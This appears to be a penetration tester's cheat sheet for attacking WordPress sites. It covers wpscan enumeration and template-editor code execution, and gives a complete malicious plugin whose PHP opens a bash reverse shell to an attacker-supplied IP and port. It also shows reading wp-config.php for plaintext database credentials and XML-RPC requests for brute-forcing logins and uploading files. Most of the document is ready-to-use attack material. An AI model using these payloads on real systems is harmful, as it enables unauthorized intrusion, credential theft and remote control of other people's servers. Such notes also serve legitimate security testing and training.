# Wordpress

## Standard pages and folders

#### License files

* `/license.txt`
* `/readme.html`

#### Login pages

* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`

#### Resource folders

* `wp-content/uploads/` resources folder
* `wp-content/themes/` themes folder
* `wp-includes/` plugins, scripts and widgets

## Plugin enumeration

Enumeration can be executed with the tool wpscan downloadable [here](https://github.com/wpscanteam/wpscan)

```http
wpscan --update
wpscan --url <host> --enumerate u,p            #list users and installed lugins
wpscan --url <host> --enumerate ap,at,cb,dbe   #bruteforce installed plugins, better results but really
```

## Authenticated RCE

These attacks require access to the administrative console

### Template editor

It is possible to use the template editor to modify a php page.  The best target is the 404 page since it can be triggered easily. If not possible the modified files are usually located under `/wp-content/themes/<theme>/<page>.php`

### Plugin upload functionality

It is possible to upload and execute a reverse shell payload by abusing the install plugin functionality

Create a .php file as follows then zip it and upload the archive. Once uploaded press the "Activate" button

```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
?>
```

## Pivoting

This file contains plain-text username and password for database login. Sometimes these credentials can also be used to authenticate as another user on target machine.

```http
cat <wp folder>/wp-config.php    #local
wget <url>/wp-config.php         #remote
```

## XML-RPC

### Check if active

Send the following request to /xmlrpc.php

```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

### Credentials bruteforce

You can use `wp.getUsersBlogs`, `wp.getCategories` or `metaWeblog.getUsersBlogs` as value for the `methodName` field

```
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>[user]</value></param>
<param><value>[pass]</value></param>
</params>
</methodCall>
```

### File upload

Requires valid credentials

```
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
	<methodName>wp.uploadFile</methodName>
	<params>
		<param><value><string>1</string></value></param>
		<param><value><string>[user]</string></value></param>
		<param><value><string>[pass]</string></value></param>
		<param>
			<value>
				<struct>
					<member>
						<name>name</name>
						<value><string>[filename]</string></value>
					</member>
					<member>
						<name>type</name>
						<value><string>[mime type]</string></value>
					</member>
					<member>
						<name>bits</name>
						<value><base64><![CDATA[base64 blob here]]></base64></value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```
